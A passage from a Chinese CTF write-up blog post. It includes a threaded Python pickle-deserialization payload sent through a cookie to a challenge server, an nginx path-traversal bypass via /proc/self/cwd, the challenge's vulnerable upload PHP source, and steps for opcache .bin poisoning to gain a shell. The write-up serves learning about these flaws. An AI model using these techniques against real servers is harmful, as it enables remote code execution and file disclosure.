src=\"image\\0073227d20f14b14956c14b986cc641f.png\"/></p>\n<p>python和golang json解析差异<br/> <img alt=\"在这里插入图片描述\" src=\"image\\e904be5e799c449ab9670cbd94818028.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\33b3bf044b5e4c129472e2a9ee3bb924.png\"/></p>\n<h1><a id=\"crash_196\"></a>crash</h1>\n<p>存在反序列化，可以直接调用系统命令，剩下的就是怎么触发504了。可以跑个多线程来运行sleep，使得某些线程调用不上造成504。<br/> payload</p>\n<pre><code class=\"prism language-py\"><span class=\"token comment\">#author:yu22x</span>\n<span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> requests \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> threading\nurl<span class=\"token operator\">=</span><span class=\"token string\">\"http://182.92.223.176:35240/\"</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    a<span class=\"token operator\">=</span><span class=\"token string\">b\"(cos\\nsystem\\nS'sleep 5'\\no.\"</span>\n    a <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n    r<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">'balancer'</span><span class=\"token punctuation\">,</span>headers<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">'Cookie'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'userdata='</span><span class=\"token operator\">+</span>a<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">write2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    a<span class=\"token operator\">=</span><span class=\"token string\">b\"(cos\\nsystem\\nS'sleep 10'\\no.\"</span>\n    a <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n    r<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">'balancer'</span><span class=\"token punctuation\">,</span>headers<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">'Cookie'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'userdata='</span><span class=\"token operator\">+</span>a<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">write3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    a<span class=\"token operator\">=</span><span class=\"token string\">b\"(cos\\nsystem\\nS'sleep 15'\\no.\"</span>\n    a <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n    r<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">'balancer'</span><span class=\"token punctuation\">,</span>headers<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">'Cookie'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'userdata='</span><span class=\"token operator\">+</span>a<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">write4</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    a<span class=\"token operator\">=</span><span class=\"token string\">b\"(cos\\nsystem\\nS'sleep 20'\\no.\"</span>\n    a <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n    r<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">'balancer'</span><span class=\"token punctuation\">,</span>headers<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">'Cookie'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'userdata='</span><span class=\"token operator\">+</span>a<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    event<span class=\"token operator\">=</span>threading<span class=\"token punctuation\">.</span>Event<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> session<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n            threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n            threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>write2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n            threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>write3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n            threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>write4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    event<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n</code></pre>\n<h1><a id=\"uploadpro_241\"></a>uploadpro</h1>\n<p>开局一个上传页面，但是限制的比较死，不过留了bin、hex、dat后缀，<br/> 而且存在phpinfo页面。<br/> bin就有点可疑了，可以联想到利用opcache来getshell<br/> <code>https://www.anquanke.com/post/id/83844</code><br/> 但是这个要利用成功的话需要上传文件的路径可控。<br/> 好在题目给我们预设了一个nginx目录穿越漏洞。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\a755e29773934b7e817304cf0cb35bc7.png\"/><br/> var目录直接是403，然后读了下nginx的配置。有个配置的内容很有意思</p>\n<pre><code>/uploads../etc/nginx/sites-available/default\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\9dea0b8fb20049ed88687f722e6dd57b.png\"/><br/> 路径中匹配到这些都会403，但是var是匹配到./var，可以通过/proc/self/cwd绕一下。</p>\n<p><code>/uploads../proc/self/cwd/var/www/html/</code><br/> 读到了index.php的源码</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> html<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>html<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>head<span class=\"token operator\">&gt;</span>\n   <span class=\"token operator\">&lt;</span>title<span class=\"token operator\">&gt;</span>文件上传<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">&gt;</span>\n   <span class=\"token operator\">&lt;</span>meta charset<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"utf-8\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>head<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>body<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"index.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"post\"</span> enctype<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"multipart/form-data\"</span><span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"max_file_size\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1048576\"</span><span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"上传\"</span><span class=\"token operator\">&gt;</span>\n       <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n   \n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_METHOD'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"GET\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n   <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"content-type:text/html;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\0\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$prefix</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'prefix'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\0\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'prefix'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$temp_name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'size'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$error</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$size</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span><span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n      <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script&gt;alert('文件大小超过2M大小');window.history.go(-1);&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n   <span class=\"token variable\">$arr</span> <span class=\"token operator\">=</span> <span class=\"token function\">pathinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$ext_suffix</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'extension'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$allow_suffix</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'jpg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'gif'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'jpeg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'png'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"bin\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hex\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"dat\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"docx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"xlsx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ext_suffix</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allow_suffix</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n      <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script&gt;alert('上传的文件类型只能是jpg,gif,jpeg,png,bin,hex,dat');window.history.go(-1);&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_name</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'/uploads/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$prefix</span><span class=\"token operator\">.</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n      <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script&gt;alert('文件上传成功! Path /uploads/<span class=\"token interpolation\"><span class=\"token variable\">$prefix</span></span><span class=\"token interpolation\"><span class=\"token variable\">$filename</span></span>');&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n      <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script&gt;alert('文件上传失败,错误码：<span class=\"token interpolation\"><span class=\"token variable\">$error</span></span>');&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n\n <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n</code></pre>\n<p>存在一个prefix参数，可以传个上传路径。这样上传文件的路径就可控了。<br/> 按照上面文章上的方法，我们需要将bin文件上传<code>到/tmp/opcache/[system_id]/var/www/</code><br/> 而且因为可以目录穿越system_id的值也不需要我们计算。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\0f966d46933e499bb9ba7e318872fcee.png\"/><br/> 但是在phpinfo中可以看到opcache.file_cache_only值为0，opcache.validate_timestamps为on。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\925eb421053e408e811bc382036e4f60.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\cb5457236073451995924c98dd958dd4.png\"/><br/> 这两个都需要绕过。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\15f6fdd0ccb5439d967f8a80aa723ea6.png\"/></p>\n<p>第一个我们可以重置容器，直接上传phpinfo.php.bin用于生成phpinfo.php的缓存。<br/> 第二个我们需要获取一个时间戳。<br/> 首先通过目录遍历直接下载下来index.php.bin，然后本地放入010editor中，找到他的时间戳。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\bdfb17d75cb34d18b7a499453d8baed1.png\"/><br/> 接着本地搭建带opcache的环境（FROM php:7.4.3-apache）生成恶意的bin文件，然后将本地的时间戳改成相同的。最后访问phpinfo.php，恶意代码即可执行。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\68823a49c8a8495d93e97e3b09f2a06a.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\63c61f9aab3e4970b84fda1caf9921d6.png\"/></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}